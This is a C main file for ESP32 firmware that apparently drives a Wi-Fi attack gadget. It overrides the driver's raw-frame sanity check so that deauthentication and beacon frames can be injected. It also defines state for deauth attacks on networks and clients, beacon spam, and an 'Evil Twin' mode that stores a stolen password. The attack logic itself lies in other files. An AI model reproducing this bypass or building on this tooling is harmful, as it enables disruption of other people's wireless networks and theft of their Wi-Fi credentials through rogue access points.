#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_http_client.h"
#include "esp_https_ota.h"
#include "globals.h"
#include "photo_data.h"
#include "esp_netif.h"
#include "esp_event.h"




extern void loopWiFi(void *pvParameters);
extern void task_display(void *pvParameters);
// ==========================================
// THE BYPASSER: JIMAT SAKTI DEAUTH & BEACON
// ==========================================
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { 
    return 0; // Loloskan semua paket 0xC0 & 0x80 tanpa dicek!
}


// --- DEFINISI VARIABEL GLOBAL ---
// Di bagian definisi variabel atas
bool triggerTrack = false;


// Definisi asli variabel Evil Twin
bool isEvilTwin = false;
int evilTwinState = 0; 
char stolenPassword[64] = "";
bool triggerEvilTwin = false;



char inputPassword[64] = {0};
int cursorPass = 0;
int statusKoneksi = 0;
bool isWiFiConnected = false;
char connSSID[33] = {0};
int connCH = 0;
int connRSSI = 0;
bool triggerConnect = false;
bool triggerDisconnect = false;


int batteryPercent = 0;

int deauthProgress = 0;
bool adaTargetSta = false;
bool isDeauthSta = false;
bool inSubMenu = false;
int currentMenu = 0;
int currentSub = 0;
int topMenu = 0;
WiFiData listWiFi[30];
StationInfo listStation[30];
int brightnessValue = 150;
int spamState = 0; 
bool isSpamming = false;
int aktifModeSpam = 0;
bool spamUdahSetup = false;
bool deauthUdahSetup = false;
int scannerState = 0; 
int scannerStateSta = 0; 
uint32_t popUpTimer = 0; 
bool triggerScan = false; 
bool triggerScanSta = false; 
bool scanDone = false;    
bool scanStaDone = false;    
int totalWiFi = 0;
int totalStation = 0;
int cursorInScanner = 0; 
int cursorInScanSta = 0; 
int scrollPosScanner = 0;
int targetLockedIdx = -1;
int contextCursor = 0;
StationInfo targetSta;
WiFiData targetTerkunci; 
bool adaTarget = false;  
int deauthState = 0;
bool isDeauthing = false;
bool sedang_scan = false;
int appMode = 0;

TaskHandle_t TaskWiFi;

// ==========================================
// APP MAIN LU
// ==========================================
void app_main(void) {
    ESP_LOGI("GhostCore", "System Booting...");
    
    xTaskCreate(task_display, "DisplayTask", 8192, NULL, 1, NULL);
xTaskCreate(loopWiFi, "TaskWiFi", 16384, NULL, 1, &TaskWiFi);

}
